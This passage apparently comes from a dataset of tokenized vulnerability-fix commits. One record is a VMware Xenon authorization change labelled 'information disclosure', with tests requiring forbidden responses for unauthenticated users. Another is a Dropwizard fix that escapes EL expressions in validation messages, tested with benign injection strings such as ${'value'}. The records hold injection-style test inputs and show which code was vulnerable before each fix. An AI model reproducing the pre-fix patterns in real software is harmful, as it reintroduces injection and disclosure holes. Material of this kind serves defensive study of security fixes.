"factoryTemplateUri", "=", "UriUtils", ".", "buildUri", "(", "host", ",", "UriUtils", ".", "buildUriPath", "(", "ExampleService", ".", "FACTORY_LINK", ",", "SERVICE_URI_SUFFIX_TEMPLATE", ")", ");", "URI", "factoryUiUri", "=", "UriUtils", ".", "buildUri", "(", "host", ",", "UriUtils", ".", "buildUriPath", "(", "ExampleService", ".", "FACTORY_LINK", ",", "SERVICE_URI_SUFFIX_UI", ")", ");", "URI", "serviceAvailableUri", "=", "UriUtils", ".", "buildAvailableUri", "(", "host", ",", "postResult", ".", "documentSelfLink", ")", ";", "URI", "serviceStatsUri", "=", "UriUtils", ".", "buildStatsUri", "(", "host", ",", "postResult", ".", "documentSelfLink", ")", ";", "URI", "serviceConfigUri", "=", "UriUtils", ".", "buildConfigUri", "(", "host", ",", "postResult", ".", "documentSelfLink", ")", ";", "URI", "serviceSubscriptionUri", "=", "UriUtils", ".", "buildSubscriptionUri", "(", "host", ",", "postResult", ".", "documentSelfLink", ")", ";", "URI", "serviceTemplateUri", "=", "UriUtils", ".", "buildUri", "(", "host", ",", "UriUtils", ".", "buildUriPath", "(", "postResult", ".", "documentSelfLink", ",", "SERVICE_URI_SUFFIX_TEMPLATE", ")", ");", "URI", "serviceUiUri", "=", "UriUtils", ".", "buildUri", "(", "host", ",", "UriUtils", ".", "buildUriPath", "(", "postResult", ".", "documentSelfLink", ",", "SERVICE_URI_SUFFIX_UI", ")", ");", "/", "/", "check", "non", "-", "authenticated", "user", "receives", "forbidden", "response", "FailureResponse", "failureResponse", ";", "Operation", "uiOpResult", ";", "/", "/", "check", "factory", "endpoints", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "factoryAvailableUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "factoryStatsUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "factoryConfigUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "factorySubscriptionUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "factoryTemplateUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "uiOpResult", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "factoryUiUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "uiOpResult", ".", "getStatusCode", "(", "))", ";", "/", "/", "check", "service", "endpoints", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "serviceAvailableUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "serviceStatsUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "serviceConfigUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "serviceSubscriptionUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "serviceTemplateUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "uiOpResult", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "serviceUiUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "uiOpResult", ".", "getStatusCode", "(", "))", ";", "/", "/", "check", "authenticated", "user", "does", "NOT", "receive", "forbidden", "response", "AuthTestUtils", ".", "login", "(", "host", ",", "exampleUser", ",", "examplePass", ")", ";", "Operation", "response", ";", "/", "/", "check", "factory", "endpoints", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "factoryAvailableUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "factoryStatsUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "factoryConfigUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "factorySubscriptionUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "factoryTemplateUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "factoryUiUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "/", "/", "check", "service", "endpoints", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "serviceAvailableUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "serviceStatsUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "serviceConfigUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "serviceSubscriptionUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "serviceTemplateUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "serviceUiUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "}", "}", "@", "@", "-", "30", ",", "6", "+", "30", ",", "7", "@", "@", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "ServiceHost", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "UriUtils", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "Utils", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "ExampleService", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "ExampleService", ".", "ExampleServiceState", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "QueryTask", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "QueryTask", ".", "Query", ";", "@", "@", "-", "247", ",", "6", "+", "248", ",", "22", "@", "@", "public", "String", "getUserGroupName", "(", "String", "email", ")", "{", "UriUtils", ".", "buildUriPath", "(", "ServiceUriPaths", ".", "CORE_AUTHZ_USERS", ",", "email", ")", ")", ".", "build", "(", "))", ";", "/", "/", "Create", "resource", "group", "to", "allow", "access", "on", "utility", "paths", "String", "statsResourceGroupLink", "=", "createResourceGroup", "(", "target", ",", "\"", "stats", "-", "resource", "-", "group", "\"", ",", "Builder", ".", "create", "(", ")", ".", "addFieldClause", "(", "ServiceDocument", ".", "FIELD_NAME_SELF_LINK", ",", "ExampleService", ".", "FACTORY_LINK", "+", "ServiceHost", ".", "SERVICE_URI_SUFFIX_STATS", ")", ".", "build", "(", "))", ";", "String", "subscriptionsResourceGroupLink", "=", "createResourceGroup", "(", "target", ",", "\"", "subs", "-", "resource", "-", "group", "\"", ",", "Builder", ".", "create", "(", ")", ".", "addFieldClause", "(", "ServiceDocument", ".", "FIELD_NAME_SELF_LINK", ",", "ServiceUriPaths", ".", "CORE_LOCAL_QUERY_TASKS", "+", "ServiceHost", ".", "SERVICE_URI_SUFFIX_SUBSCRIPTIONS", ")", ".", "build", "(", "))", ";", "Collection", "<", "String", ">", "paths", "=", "new", "HashSet", "<", ">(", ");", "/", "/", "Create", "roles", "tying", "these", "together", "@", "@", "-", "261", ",", "6", "+", "278", ",", "16", "@", "@", "public", "String", "getUserGroupName", "(", "String", "email", ")", "{", "/", "/", "Create", "role", "authorizing", "access", "to", "the", "user", "'", "s", "own", "query", "tasks", "paths", ".", "add", "(", "createRole", "(", "target", ",", "userGroupLink", ",", "queryTaskResourceGroupLink", ",", "new", "HashSet", "<", ">(", "Arrays", ".", "asList", "(", "Action", ".", "GET", ",", "Action", ".", "POST", ",", "Action", ".", "PATCH", ",", "Action", ".", "DELETE", ")", "))", ");", "/", "/", "Create", "role", "authorizing", "access", "to", "/", "stats", "paths", ".", "add", "(", "createRole", "(", "target", ",", "userGroupLink", ",", "statsResourceGroupLink", ",", "new", "HashSet", "<", ">(", "Arrays", ".", "asList", "(", "Action", ".", "GET", ",", "Action", ".", "POST", ",", "Action", ".", "PATCH", ",", "Action", ".", "DELETE", ")", "))", ");", "/", "/", "Create", "role", "authorizing", "access", "to", "/", "subscriptions", "of", "query", "tasks", "paths", ".", "add", "(", "createRole", "(", "target", ",", "userGroupLink", ",", "subscriptionsResourceGroupLink", ",", "new", "HashSet", "<", ">(", "Arrays", ".", "asList", "(", "Action", ".", "GET", ",", "Action", ".", "POST", ",", "Action", ".", "PATCH", ",", "Action", ".", "DELETE", ")", "))", ");", "return", "paths", ";", "}", "@", "@", "-", "83", ",", "6", "+", "83", ",", "7", "@", "@", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "Operation", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "Operation", ".", "AuthorizationContext", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "Operation", ".", "CompletionHandler", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "OperationContext", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "Service", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "Service", ".", "Action", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "Service", ".", "ServiceOption", ";", "@", "@", "-", "1052", ",", "7", "+", "1053", ",", "15", "@", "@", "public", "ServiceDocumentQueryResult", "getExpandedFactoryState", "(", "URI", "factoryUri", ")", "{", "}", "public", "Map", "<", "String", ",", "ServiceStat", ">", "getServiceStats", "(", "URI", "serviceUri", ")", "{", "AuthorizationContext", "ctx", "=", "null", ";", "if", "(", "this", ".", "isAuthorizationEnabled", "(", "))", "{", "ctx", "=", "OperationContext", ".", "getAuthorizationContext", "(", ");", "this", ".", "setSystemAuthorizationContext", "(", ");", "}", "ServiceStats", "stats", "=", "this", ".", "sender", ".", "sendStatsGetAndWait", "(", "serviceUri", ")", ";", "if", "(", "this", ".", "isAuthorizationEnabled", "(", "))", "{", "this", ".", "setAuthorizationContext", "(", "ctx", ")", ";", "}", "return", "stats", ".", "entries", ";", "}", "@", "@", "-", "3023", ",", "6", "+", "3023", ",", "7", "@", "@", "public", "void", "replicationWithAuthzCacheClear", "(", ")", "throws", "Throwable", "{", "VerificationHost", "groupHost", "=", "this", ".", "host", ".", "getPeerHost", "(", ");", "groupHost", ".", "setSystemAuthorizationContext", "(", ");", "/", "/", "wait", "for", "auth", "related", "services", "to", "be", "stabilized", "groupHost", ".", "waitForReplicatedFactoryServiceAvailable", "(", "UriUtils", ".", "buildUri", "(", "groupHost", ",", "UserService", ".", "FACTORY_LINK", ")", ");", "@", "@", "-", "3040", ",", "7", "+", "3041", ",", "7", "@", "@", "public", "void", "replicationWithAuthzCacheClear", "(", ")", "throws", "Throwable", "{", "String", "bazUserLink", "=", "UriUtils", ".", "buildUriPath", "(", "ServiceUriPaths", ".", "CORE_AUTHZ_USERS", ",", "\"", "baz", "@", "vmware", ".", "com", "\"", ");", "groupHost", ".", "setSystemAuthorizationContext", "(", ");", "/", "/", "create", "user", ",", "user", "-", "group", ",", "resource", "-", "group", ",", "role", "for", "foo", "@", "vmware", ".", "com", "/", "/", "user", ":", "/", "core", "/", "authz", "/", "users", "/", "foo", "@", "vmware", ".", "com", "@", "@", "-", "3251", ",", "7", "+", "3252", ",", "7", "@", "@", "private", "void", "populateAuthCacheInAllPeers", "(", "AuthorizationContext", "authContext", ")", "throw", "/", "/", "based", "on", "the", "role", "created", "in", "test", ",", "all", "users", "have", "access", "to", "ExampleService", "this", ".", "host", ".", "sendAndWaitExpectSuccess", "(", "Operation", ".", "createGet", "(", "UriUtils", ".", "buildStatsUri", "(", "peer", ",", "ExampleService", ".", "FACTORY_LINK", ")", "))", ";", "Operation", ".", "createGet", "(", "UriUtils", ".", "buildUri", "(", "peer", ",", "ExampleService", ".", "FACTORY_LINK", ")", "))", ";", "}", "this", ".", "host", ".", "waitFor", "(", "\"", "Timeout", "waiting", "for", "correct", "auth", "cache", "state", "\"", ","], "docstring_tokens": ["information", "disclosure"]}
{"contents": ["Escape", "EL", "expressions", "in", "ViolationCollector", "(#3157)", "Fixes", "#3153"], "code_tokens": ["@", "@", "-", "1", ",", "12", "+", "1", ",", "16", "@", "@", "package", "io", ".", "dropwizard", ".", "validation", ".", "selfvalidating", ";", "import", "javax", ".", "annotation", ".", "Nullable", ";", "import", "javax", ".", "validation", ".", "ConstraintValidatorContext", ";", "import", "java", ".", "util", ".", "regex", ".", "Matcher", ";", "import", "java", ".", "util", ".", "regex", ".", "Pattern", ";", "/", "**", "*", "This", "class", "is", "a", "simple", "wrapper", "around", "the", "ConstraintValidatorContext", "of", "hibernate", "validation", ".", "*", "It", "collects", "all", "the", "violations", "of", "the", "SelfValidation", "methods", "of", "an", "object", ".", "*", "/", "public", "class", "ViolationCollector", "{", "private", "static", "final", "Pattern", "ESCAPE_PATTERN", "=", "Pattern", ".", "compile", "(", "\"\\", "\\$", "\\\\", "{\"", ");", "private", "boolean", "violationOccurred", "=", "false", ";", "private", "ConstraintValidatorContext", "context", ";", "@", "@", "-", "17", ",", "14", "+", "21", ",", "80", "@", "@", "public", "ViolationCollector", "(", "ConstraintValidatorContext", "context", ")", "{", "}", "/", "**", "*", "Adds", "a", "new", "violation", "to", "this", "collector", ".", "This", "also", "sets", "violationOccurred", "to", "true", ".", "*", "Adds", "a", "new", "violation", "to", "this", "collector", ".", "This", "also", "sets", "{", "@", "code", "violationOccurred", "}", "to", "{", "@", "code", "true", "}", ".", "*", "*", "@", "param", "msg", "the", "message", "of", "the", "violation", "*", "@", "param", "message", "the", "message", "of", "the", "violation", "(", "any", "EL", "expression", "will", "be", "escaped", "and", "not", "parsed", ")", "*", "/", "public", "void", "addViolation", "(", "String", "msg", ")", "{", "public", "void", "addViolation", "(", "String", "message", ")", "{", "violationOccurred", "=", "true", ";", "context", ".", "buildConstraintViolationWithTemplate", "(", "msg", ")", ".", "addConstraintViolation", "(", ");", "String", "messageTemplate", "=", "escapeEl", "(", "message", ")", ";", "context", ".", "buildConstraintViolationWithTemplate", "(", "messageTemplate", ")", ".", "addConstraintViolation", "(", ");", "}", "/", "**", "*", "Adds", "a", "new", "violation", "to", "this", "collector", ".", "This", "also", "sets", "{", "@", "code", "violationOccurred", "}", "to", "{", "@", "code", "true", "}", ".", "*", "*", "@", "param", "propertyName", "the", "name", "of", "the", "property", "*", "@", "param", "message", "the", "message", "of", "the", "violation", "(", "any", "EL", "expression", "will", "be", "escaped", "and", "not", "parsed", ")", "*", "@", "since", "2", ".", "0", ".", "2", "*", "/", "public", "void", "addViolation", "(", "String", "propertyName", ",", "String", "message", ")", "{", "violationOccurred", "=", "true", ";", "String", "messageTemplate", "=", "escapeEl", "(", "message", ")", ";", "context", ".", "buildConstraintViolationWithTemplate", "(", "messageTemplate", ")", ".", "addPropertyNode", "(", "propertyName", ")", ".", "addConstraintViolation", "(", ");", "}", "/", "**", "*", "Adds", "a", "new", "violation", "to", "this", "collector", ".", "This", "also", "sets", "{", "@", "code", "violationOccurred", "}", "to", "{", "@", "code", "true", "}", ".", "*", "*", "@", "param", "propertyName", "the", "name", "of", "the", "property", "with", "the", "violation", "*", "@", "param", "index", "the", "index", "of", "the", "element", "with", "the", "violation", "*", "@", "param", "message", "the", "message", "of", "the", "violation", "(", "any", "EL", "expression", "will", "be", "escaped", "and", "not", "parsed", ")", "*", "@", "since", "2", ".", "0", ".", "2", "*", "/", "public", "void", "addViolation", "(", "String", "propertyName", ",", "Integer", "index", ",", "String", "message", ")", "{", "violationOccurred", "=", "true", ";", "String", "messageTemplate", "=", "escapeEl", "(", "message", ")", ";", "context", ".", "buildConstraintViolationWithTemplate", "(", "messageTemplate", ")", ".", "addPropertyNode", "(", "propertyName", ")", ".", "addBeanNode", "(", ").", "inIterable", "(", ").", "atIndex", "(", "index", ")", ".", "addConstraintViolation", "(", ");", "}", "/", "**", "*", "Adds", "a", "new", "violation", "to", "this", "collector", ".", "This", "also", "sets", "{", "@", "code", "violationOccurred", "}", "to", "{", "@", "code", "true", "}", ".", "*", "*", "@", "param", "propertyName", "the", "name", "of", "the", "property", "with", "the", "violation", "*", "@", "param", "key", "the", "key", "of", "the", "element", "with", "the", "violation", "*", "@", "param", "message", "the", "message", "of", "the", "violation", "(", "any", "EL", "expression", "will", "be", "escaped", "and", "not", "parsed", ")", "*", "@", "since", "2", ".", "0", ".", "2", "*", "/", "public", "void", "addViolation", "(", "String", "propertyName", ",", "String", "key", ",", "String", "message", ")", "{", "violationOccurred", "=", "true", ";", "String", "messageTemplate", "=", "escapeEl", "(", "message", ")", ";", "context", ".", "buildConstraintViolationWithTemplate", "(", "messageTemplate", ")", ".", "addPropertyNode", "(", "propertyName", ")", ".", "addBeanNode", "(", ").", "inIterable", "(", ").", "atKey", "(", "key", ")", ".", "addConstraintViolation", "(", ");", "}", "@", "Nullable", "private", "String", "escapeEl", "(", "@", "Nullable", "String", "s", ")", "{", "if", "(", "s", "=", "=", "null", "|", "|", "s", ".", "isEmpty", "(", "))", "{", "return", "s", ";", "}", "final", "Matcher", "m", "=", "ESCAPE_PATTERN", ".", "matcher", "(", "s", ")", ";", "final", "StringBuffer", "sb", "=", "new", "StringBuffer", "(", "s", ".", "length", "(", ")", "+", "16", ")", ";", "while", "(", "m", ".", "find", "(", "))", "{", "m", ".", "appendReplacement", "(", "sb", ",", "\"", "\\\\", "\\\\", "\\\\", "${", "\")", ";", "}", "m", ".", "appendTail", "(", "sb", ")", ";", "return", "sb", ".", "toString", "(", ");", "}", "/", "**", "@", "@", "-", "1", ",", "64", "+", "1", ",", "68", "@", "@", "package", "io", ".", "dropwizard", ".", "validation", ";", "import", "static", "org", ".", "assertj", ".", "core", ".", "api", ".", "Assertions", ".", "assertThat", ";", "import", "javax", ".", "annotation", ".", "concurrent", ".", "NotThreadSafe", ";", "import", "javax", ".", "validation", ".", "Validator", ";", "import", "org", ".", "junit", ".", "jupiter", ".", "api", ".", "AfterEach", ";", "import", "org", ".", "junit", ".", "jupiter", ".", "api", ".", "BeforeEach", ";", "import", "org", ".", "junit", ".", "jupiter", ".", "api", ".", "Test", ";", "import", "io", ".", "dropwizard", ".", "validation", ".", "selfvalidating", ".", "SelfValidating", ";", "import", "io", ".", "dropwizard", ".", "validation", ".", "selfvalidating", ".", "SelfValidation", ";", "import", "io", ".", "dropwizard", ".", "validation", ".", "selfvalidating", ".", "ViolationCollector", ";", "import", "org", ".", "junit", ".", "jupiter", ".", "api", ".", "AfterEach", ";", "import", "org", ".", "junit", ".", "jupiter", ".", "api", ".", "BeforeEach", ";", "import", "org", ".", "junit", ".", "jupiter", ".", "api", ".", "Test", ";", "import", "uk", ".", "org", ".", "lidalia", ".", "slf4jext", ".", "Level", ";", "import", "uk", ".", "org", ".", "lidalia", ".", "slf4jtest", ".", "LoggingEvent", ";", "import", "uk", ".", "org", ".", "lidalia", ".", "slf4jtest", ".", "TestLoggerFactory", ";", "import", "javax", ".", "annotation", ".", "concurrent", ".", "NotThreadSafe", ";", "import", "javax", ".", "validation", ".", "Validator", ";", "import", "static", "org", ".", "assertj", ".", "core", ".", "api", ".", "Assertions", ".", "assertThat", ";", "@", "NotThreadSafe", "public", "class", "SelfValidationTest", "{", "private", "static", "final", "String", "FAILED", "=", "\"", "failed", "\"", ";", "private", "static", "final", "String", "FAILED_RESULT", "=", "\"", "\"", "+", "FAILED", ";", "@", "BeforeEach", "@", "AfterEach", "@", "AfterEach", "@", "BeforeEach", "public", "void", "clearAllLoggers", "(", ")", "{", "/", "/", "this", "must", "be", "a", "clear", "all", "because", "the", "validation", "runs", "in", "other", "threads", "TestLoggerFactory", ".", "clearAll", "(", ");", "}", "@", "SelfValidating", "public", "static", "class", "FailingExample", "{", "@", "SuppressWarnings", "(", "\"", "unused", "\"", ")", "@", "SelfValidation", "public", "void", "validateFail", "(", "ViolationCollector", "col", ")", "{", "col", ".", "addViolation", "(", "FAILED", ")", ";", "}", "}", "public", "static", "class", "SubclassExample", "extends", "FailingExample", "{", "@", "SuppressWarnings", "(", "\"", "unused", "\"", ")", "@", "SelfValidation", "public", "void", "subValidateFail", "(", "ViolationCollector", "col", ")", "{", "col", ".", "addViolation", "(", "FAILED", "+", "\"", "subclass", "\"", ");", "}", "col", ".", "addViolation", "(", "FAILED", "+", "\"", "subclass", "\"", ");", "}", "}", "@", "SelfValidating", "public", "static", "class", "AnnotatedSubclassExample", "extends", "FailingExample", "{", "@", "SuppressWarnings", "(", "\"", "unused", "\"", ")", "@", "SelfValidation", "public", "void", "subValidateFail", "(", "ViolationCollector", "col", ")", "{", "col", ".", "addViolation", "(", "FAILED", "+", "\"", "subclass", "\"", ");", "}", "col", ".", "addViolation", "(", "FAILED", "+", "\"", "subclass", "\"", ");", "}", "}", "public", "static", "class", "OverridingExample", "extends", "FailingExample", "{", "@", "Override", "public", "void", "validateFail", "(", "ViolationCollector", "col", ")", "{", "}", "}", "}", "@", "SelfValidating", "public", "static", "class", "DirectContextExample", "{", "@", "SuppressWarnings", "(", "\"", "unused", "\"", ")", "@", "SelfValidation", "public", "void", "validateFail", "(", "ViolationCollector", "col", ")", "{", "col", ".", "getContext", "(", ").", "buildConstraintViolationWithTemplate", "(", "FAILED", ")", ".", "addConstraintViolation", "(", ");", "@", "@", "-", "102", ",", "19", "+", "106", ",", "28", "@", "@", "private", "void", "validateFailPrivate", "(", "ViolationCollector", "col", ")", "{", "@", "SelfValidating", "public", "static", "class", "ComplexExample", "{", "@", "SuppressWarnings", "(", "\"", "unused", "\"", ")", "@", "SelfValidation", "public", "void", "validateFail1", "(", "ViolationCollector", "col", ")", "{", "col", ".", "addViolation", "(", "FAILED", "+", "\"", "1", "\"", ");", "}", "@", "SuppressWarnings", "(", "\"", "unused", "\"", ")", "@", "SelfValidation", "public", "void", "validateFail2", "(", "ViolationCollector", "col", ")", "{", "col", ".", "addViolation", "(", "FAILED", "+", "\"", "2", "\"", ");", "col", ".", "addViolation", "(", "\"", "p2", "\"", ",", "FAILED", ")", ";", "}", "@", "SuppressWarnings", "(", "\"", "unused", "\"", ")", "@", "SelfValidation", "public", "void", "validateFail3", "(", "ViolationCollector", "col", ")", "{", "col", ".", "addViolation", "(", "FAILED", "+", "\"", "3", "\"", ");", "col", ".", "addViolation", "(", "\"", "p", "\"", ",", "3", ",", "FAILED", ")", ";", "}", "@", "SuppressWarnings", "(", "\"", "unused", "\"", ")", "@", "SelfValidation", "public", "void", "validateFail4", "(", "ViolationCollector", "col", ")", "{", "col", ".", "addViolation", "(", "\"", "p", "\"", ",", "\"", "four", "\"", ",", "FAILED", ")", ";", "}", "@", "SuppressWarnings", "(", "\"", "unused", "\"", ")", "@", "@", "-", "127", ",", "121", "+", "140", ",", "144", "@", "@", "public", "void", "validateCorrect", "(", "ViolationCollector", "col", ")", "{", "public", "static", "class", "NoValidations", "{", "}", "@", "SelfValidating", "public", "static", "class", "InjectionExample", "{", "@", "SuppressWarnings", "(", "\"", "unused", "\"", ")", "@", "SelfValidation", "public", "void", "validateFail", "(", "ViolationCollector", "col", ")", "{", "col", ".", "addViolation", "(", "\"$", "{'", "value", "'", "}\"", ");", "col", ".", "addViolation", "(", "\"$", "{'", "property", "'", "}\"", ",", "\"", "${", "'", "value", "'", "}\"", ");", "col", ".", "addViolation", "(", "\"$", "{'", "property", "'", "}\"", ",", "1", ",", "\"", "${", "'", "value", "'", "}\"", ");", "col", ".", "addViolation", "(", "\"$", "{'", "property", "'", "}\"", ",", "\"", "${", "'", "key", "'", "}\"", ",", "\"", "${", "'", "value", "'", "}\"", ");", "}", "}", "private", "final", "Validator", "validator", "=", "BaseValidator", ".", "newValidator", "(", ");", "@", "Test", "public", "void", "failingExample", "(", ")", "throws", "Exception", "{", "public", "void", "failingExample", "(", ")", "{", "assertThat", "(", "ConstraintViolations", ".", "format", "(", "validator", ".", "validate", "(", "new", "FailingExample", "(", "))", "))", ".", "containsExactlyInAnyOrder", "(", "FAILED_RESULT", ")", ";", ".", "containsExactlyInAnyOrder", "(", "FAILED_RESULT", ")", ";", "assertThat", "(", "TestLoggerFactory", ".", "getAllLoggingEvents", "(", "))", ".", "isEmpty", "(", ");", ".", "isEmpty", "(", ");", "}", "@", "Test", "public", "void", "subClassExample", "(", ")", "throws", "Exception", "{", "public", "void", "subClassExample", "(", ")", "{", "assertThat", "(", "ConstraintViolations", ".", "format", "(", "validator", ".", "validate", "(", "new", "SubclassExample", "(", "))", "))", ".", "containsExactlyInAnyOrder", "(", "FAILED_RESULT", ",", "FAILED_RESULT", "+", "\"", "subclass", "\"", ")", ";", ".", "containsExactlyInAnyOrder", "(", "FAILED_RESULT", ",", "FAILED_RESULT", "+", "\"", "subclass", "\"", ")", ";", "assertThat", "(", "TestLoggerFactory", ".", "getAllLoggingEvents", "(", "))", ".", "isEmpty", "(", ");", ".", "isEmpty", "(", ");", "}", "@", "Test", "public", "void", "annotatedSubClassExample", "(", ")", "throws", "Exception", "{", "public", "void", "annotatedSubClassExample", "(", ")", "{", "assertThat", "(", "ConstraintViolations", ".", "format", "(", "validator", ".", "validate", "(", "new", "AnnotatedSubclassExample", "(", "))", "))", ".", "containsExactlyInAnyOrder", "(", "FAILED_RESULT", ",", "FAILED_RESULT", "+", "\"", "subclass", "\"", ")", ";", ".", "containsExactlyInAnyOrder", "(", "FAILED_RESULT", ",", "FAILED_RESULT", "+", "\"", "subclass", "\"", ")", ";", "assertThat", "(", "TestLoggerFactory", ".", "getAllLoggingEvents", "(", "))", ".", "isEmpty", "(", ");", ".", "isEmpty", "(", ");", "}", "@", "Test", "public", "void", "overridingSubClassExample", "(", ")", "throws", "Exception", "{", "public", "void", "overridingSubClassExample", "(", ")", "{", "assertThat", "(", "ConstraintViolations", ".", "format", "(", "validator", ".", "validate", "(", "new", "OverridingExample", "(", "))", "))", ".", "isEmpty", "(", ");", ".", "isEmpty", "(", ");", "assertThat", "(", "TestLoggerFactory", ".", "getAllLoggingEvents", "(", "))", ".", "isEmpty", "(", ");", ".", "isEmpty", "(", ");", "}", "@", "Test", "public", "void", "correctExample", "(", ")", "throws", "Exception", "{", "public", "void", "correctExample", "(", ")", "{", "assertThat", "(", "ConstraintViolations", ".", "format", "(", "validator", ".", "validate", "(", "new", "CorrectExample", "(", "))", "))", ".", "isEmpty", "(", ");", ".", "isEmpty", "(", ");", "assertThat", "(", "TestLoggerFactory", ".", "getAllLoggingEvents", "(", "))", ".", "isEmpty", "(", ");", ".", "isEmpty", "(", ");", "}", "@", "Test", "public", "void", "multipleTestingOfSameClass", "(", ")", "throws", "Exception", "{", "public", "void", "multipleTestingOfSameClass", "(", ")", "{", "assertThat", "(", "ConstraintViolations", ".", "format", "(", "validator", ".", "validate", "(", "new", "CorrectExample", "(", "))", "))", ".", "isEmpty", "(", ");", ".", "isEmpty", "(", ");", 